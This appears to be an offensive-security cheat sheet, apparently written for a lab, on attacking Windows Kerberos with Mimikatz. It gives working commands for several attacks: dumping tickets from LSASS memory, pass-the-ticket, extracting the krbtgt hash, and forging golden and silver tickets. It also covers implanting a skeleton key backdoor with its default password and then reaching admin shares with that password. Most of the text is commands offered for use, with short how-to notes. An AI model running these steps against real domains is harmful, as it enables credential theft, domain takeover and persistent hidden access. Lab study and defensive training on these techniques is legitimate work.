# Pass the ticket - Mimikatz

- Dumps the TGT from the LSASS memory of the machine
- when tickets are dumped using mimikatz .kirbi tickets are obtained which can be used to gain domain admin if such a ticket is present in the LSASS memory. 
- Appropriate for privilege escalation and lateral momvement if there are unsecured domain service account tickets lying around.

## Checking for proper privileges
This command must display ```Privilege '20' OK``` if it doesn't then you don't have proper Administrator privilege
```
privilege::debug
```

## Exporting all .kirbi tickets
```
sekurlsa::tickets/export
```

**Impersonate administrator tickets**

## Passing the ticket
This will cache and impersonate the ticket
```
kerberos::ptt <ticket>
```

To list and verify if the ticket was cached 
*in CMD*
```
klist
```

# Golden/Silver Ticket attacks with Mimikatz

- Silver tickets are less likely to be detected 
- Silver tickets provide access to only the targeted service whereas Golden tickets provide access to all Kerberos services

Ex: A specific use scenario for a silver ticket would be that you want to access the domain's SQL server however your current compromised user does not have access to that server. You can find an accessible service account to get a foothold with by kerberoasting that service, you can then dump the service hash and then impersonate their TGT in order to request a service ticket for the SQL service from the KDC allowing you access to the domain's SQL server.

**NOTE: KRBTGT is a service account for the KDC. If we can impersonate KRBTGT then we can create and issue service tickets to any account including the account that has been compromised**

- Golden attack dumps the ticket-granting ticket of any user on the domain, prefereably domain admin, however for a golden  ticket **krbtgt** must be dumped and for a silver ticket a domain admin or any service ticket must be dumped. 

## Dumping KRBTGT hash
**Inside mimikatz shell**
```
privilege::debug
lsadump::lsa /inject /name:krbtgt
```
- This will dump the hash and the security identifier needed to create a Golden ticket. 
- The /name can be cahnged to dump the hash of either a domain admin account or a service account 

## Creating a golden/silver ticket
- This is the command for creating a golden ticket to create a silver ticket simply put a service NTLM hash into the krbtgt slot, the sid of the service account into sid, and change the id to 1103.
```
Kerberos::golden /user:Administrator /domain:controller.local /sid: /krbtgt: /id:
```

## Using the Golden/Silver tickets to access other machines 
```
misc::cmd
```
- this will open up a new elevated command prompt with the given ticket in mimikatz

# KERBEROS BACKDOOR WITH MIMIKATZ
Along with maintaining access using golden and silver tickets mimikatz has one other trick up its sleeves when it comes to attacking Kerberos. Unlike the golden and silver ticket attacks a Kerberos backdoor is much more subtle because it acts similar to a rootkit by implanting itself into the memory of the domain forest allowing itself access to any of the machines with a master password. 

The Kerberos backdoor works by implanting a skeleton key that abuses the way that the AS-REQ validates encrypted timestamps. A skeleton key only works using Kerberos RC4 encryption. 

The default hash for a mimikatz skeleton key is 60BA4FCADC466C7A033C178194C03DF6 which makes the password -"mimikatz"

## Skeleton Key 
## How it works 

The skeleton key works by abusing the AS-REQ encrypted timestamps as I said above, the timestamp is encrypted with the users NT hash. The domain controller then tries to decrypt this timestamp with the users NT hash, once a skeleton key is implanted the domain controller tries to decrypt the timestamp using both the user NT hash and the skeleton key NT hash allowing you access to the domain forest.

```
misc:skeleton
```

- To access the forest
This share will now be available without the Administrator's password
```
net use C:\\DOMAIN-CONTROLLER\admin$ /user:Administrator mimikatz
```

Example: 
```
dir \\Desktop-1\c$ /user:Machine1 mimikatz
```
